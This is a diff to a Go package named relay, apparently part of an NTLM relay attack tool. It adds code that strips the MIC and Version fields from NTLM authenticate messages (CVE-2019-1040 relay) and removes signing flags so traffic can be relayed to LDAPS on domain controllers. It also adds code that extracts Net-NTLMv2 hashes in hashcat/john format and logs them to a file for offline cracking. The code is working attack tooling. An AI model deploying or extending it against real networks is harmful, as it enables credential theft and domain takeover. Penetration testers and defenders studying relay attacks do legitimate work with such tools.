@@ -1,6 +1,13 @@
 package relay
 
-import "encoding/binary"
+import (
+	"encoding/binary"
+	"encoding/hex"
+	"fmt"
+	"log"
+	"os"
+	"sync"
+)
 
 // NTLM flag constants used for manipulation.
 const (
@@ -30,59 +37,153 @@ func removeSigningFlags(ntlmMsg []byte) []byte {
 	return msg
 }
 
-// removeMIC strips the MIC and signing-related flags from an NTLM Type3 (Authenticate)
-// message. Used for cross-protocol relay (CVE-2019-1040).
+// removeMIC removes the Version and MIC fields from an NTLM Type3 (Authenticate)
+// message and recalculates payload offsets. Matches Impacket's structured approach:
+// it clears SIGN, ALWAYS_SIGN, KEY_EXCH, VERSION flags, removes the Version (8 bytes)
+// and MIC (16 bytes) fields entirely, and shifts all payload data 24 bytes earlier
+// with updated field descriptor offsets. This ensures the message is self-consistent
+// regardless of whether the original Type3 had a MIC.
 func removeMIC(ntlmMsg []byte) []byte {
-	if len(ntlmMsg) < 72 {
+	if len(ntlmMsg) < 64 {
 		return ntlmMsg
 	}
-	// Make a copy to avoid modifying the original
-	msg := make([]byte, len(ntlmMsg))
-	copy(msg, ntlmMsg)
 
-	// NegotiateFlags in Type3 are at offset 60 (4 bytes, little-endian)
-	flags := binary.LittleEndian.Uint32(msg[60:64])
-	flags &^= ntlmsspNegotiateSign
-	flags &^= ntlmsspNegotiateAlwaysSign
-	flags &^= ntlmsspNegotiateKeyExch
-	flags &^= ntlmsspNegotiateVersion
-	binary.LittleEndian.PutUint32(msg[60:64], flags)
+	flags := binary.LittleEndian.Uint32(ntlmMsg[60:64])
 
-	// Zero MIC field (16 bytes at offset 72) if message is long enough
-	if len(msg) >= 88 {
-		copy(msg[72:88], make([]byte, 16))
+	// Determine how many bytes to strip between the fixed header (offset 64)
+	// and the payload. Version = 8 bytes if NEGOTIATE_VERSION set, MIC = 16 bytes
+	// if payload starts at 88+.
+	hasVersion := flags&ntlmsspNegotiateVersion != 0
+	if !hasVersion {
+		// No Version field means no MIC either — nothing to remove
+		return ntlmMsg
+	}
+
+	// Find the minimum payload offset to determine if MIC is present
+	minPayload := uint32(len(ntlmMsg))
+	for _, f := range []int{12, 20, 28, 36, 44, 52} {
+		fLen := binary.LittleEndian.Uint16(ntlmMsg[f : f+2])
+		fOff := binary.LittleEndian.Uint32(ntlmMsg[f+4 : f+8])
+		if fLen > 0 && fOff < minPayload {
+			minPayload = fOff
+		}
+	}
+
+	// Calculate bytes to strip: Version (8) + MIC if present (16)
+	var stripBytes uint32
+	if minPayload >= 88 {
+		stripBytes = 24 // Version (8) + MIC (16)
+	} else if minPayload >= 72 {
+		stripBytes = 8 // Version only (no MIC)
+	} else {
+		// Payload starts at 64 — no Version or MIC fields present despite flag
+		return ntlmMsg
+	}
+
+	// Build new message: fixed header (64 bytes) + payload (everything after stripped region)
+	payloadStart := 64 + stripBytes
+	msg := make([]byte, 0, len(ntlmMsg)-int(stripBytes))
+	msg = append(msg, ntlmMsg[:64]...)          // Fixed header with flags
+	msg = append(msg, ntlmMsg[payloadStart:]...) // Payload shifted left
+
+	// Clear flags: VERSION, SIGN, ALWAYS_SIGN, KEY_EXCH
+	newFlags := binary.LittleEndian.Uint32(msg[60:64])
+	newFlags &^= ntlmsspNegotiateVersion
+	newFlags &^= ntlmsspNegotiateSign
+	newFlags &^= ntlmsspNegotiateAlwaysSign
+	newFlags &^= ntlmsspNegotiateKeyExch
+	binary.LittleEndian.PutUint32(msg[60:64], newFlags)
+
+	// Update all 6 field descriptor offsets (subtract stripBytes)
+	for _, f := range []int{12, 20, 28, 36, 44, 52} {
+		fLen := binary.LittleEndian.Uint16(msg[f : f+2])
+		if fLen > 0 {
+			fOff := binary.LittleEndian.Uint32(msg[f+4 : f+8])
+			if fOff >= payloadStart {
+				binary.LittleEndian.PutUint32(msg[f+4:f+8], fOff-stripBytes)
+			}
+		}
 	}
 
 	return msg
 }
 
 // stripType3SigningForLDAPS strips NEGOTIATE_SIGN, NEGOTIATE_SEAL, and NEGOTIATE_ALWAYS_SIGN
-// from a Type3 message's NegotiateFlags field and zeros the MIC field.
+// from a Type3 message's NegotiateFlags field and invalidates the MIC.
 // This is required for LDAPS relay because the DC returns error 48
 // ("Cannot start kerberos signing/sealing when using TLS/SSL") if signing flags are present.
-// Note: Zeroing MIC may fail on fully patched DCs that enforce MIC validation.
-// MsvAvFlags (MIC_PROVIDED) cannot be cleared because it's inside the NtChallengeResponse
-// AV_PAIRS which are integrity-protected by NtProofStr.
+// Since modifying flags invalidates the MIC, we use removeMIC to safely strip it.
+// Note: May fail on fully patched DCs that enforce MIC validation.
 func stripType3SigningForLDAPS(ntlmMsg []byte) []byte {
 	if len(ntlmMsg) < 64 {
 		return ntlmMsg
 	}
-	msg := make([]byte, len(ntlmMsg))
-	copy(msg, ntlmMsg)
 
-	// Strip SIGN, SEAL, ALWAYS_SIGN from NegotiateFlags at offset 60
+	// First remove Version+MIC safely (handles offset recalculation)
+	msg := removeMIC(ntlmMsg)
+
+	// Strip SEAL from flags (removeMIC already clears SIGN, ALWAYS_SIGN, KEY_EXCH, VERSION)
 	flags := binary.LittleEndian.Uint32(msg[60:64])
-	flags &^= ntlmsspNegotiateSign
 	flags &^= ntlmsspNegotiateSeal
-	flags &^= ntlmsspNegotiateAlwaysSign
 	binary.LittleEndian.PutUint32(msg[60:64], flags)
 
-	// Zero MIC field (16 bytes at offset 72) — modifying flags invalidates MIC
-	if len(msg) >= 88 {
-		copy(msg[72:88], make([]byte, 16))
+	return msg
+}
+
+// extractNetNTLMv2Hash extracts a Net-NTLMv2 hash from the Type2 challenge and Type3
+// authenticate messages. Returns the hash in hashcat/john format:
+//
+//	username::domain:serverChallenge:NTProofStr:ntChallengeResponseBlob
+//
+// The server challenge is 8 bytes at offset 24 in the Type2 message.
+// The NtChallengeResponse is extracted from Type3 fields at offset 20.
+// NTProofStr is the first 16 bytes; the rest is the client challenge blob.
+func extractNetNTLMv2Hash(type2, type3 []byte, domain, user string) string {
+	// Extract server challenge from Type2 (8 bytes at offset 24)
+	if len(type2) < 32 {
+		return ""
+	}
+	serverChallenge := hex.EncodeToString(type2[24:32])
+
+	// Extract NtChallengeResponse from Type3
+	// NtChallengeResponseFields: Len(2) MaxLen(2) Offset(4) at offset 20
+	if len(type3) < 28 {
+		return ""
+	}
+	ntLen := binary.LittleEndian.Uint16(type3[20:22])
+	ntOffset := binary.LittleEndian.Uint32(type3[24:28])
+
+	if ntLen < 16 || int(ntOffset)+int(ntLen) > len(type3) {
+		return ""
 	}
 
-	return msg
+	ntResponse := type3[ntOffset : ntOffset+uint32(ntLen)]
+	ntProofStr := hex.EncodeToString(ntResponse[:16])
+	ntBlob := hex.EncodeToString(ntResponse[16:])
+
+	return fmt.Sprintf("%s::%s:%s:%s:%s", user, domain, serverChallenge, ntProofStr, ntBlob)
+}
+
+var hashFileMu sync.Mutex
+
+// logCapturedHash logs a Net-NTLMv2 hash and optionally writes it to the output file.
+func logCapturedHash(hash, outputFile string) {
+	log.Printf("[*] %s", hash)
+
+	if outputFile == "" {
+		return
+	}
+
+	hashFileMu.Lock()
+	defer hashFileMu.Unlock()
+
+	f, err := os.OpenFile(outputFile, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)
+	if err != nil {
+		log.Printf("[-] Failed to write hash to %s: %v", outputFile, err)
+		return
+	}
+	defer f.Close()
+	fmt.Fprintln(f, hash)
 }
 
 // downgradeToNTLMv1 modifies a Type2 (Challenge) message flags to request NTLMv1
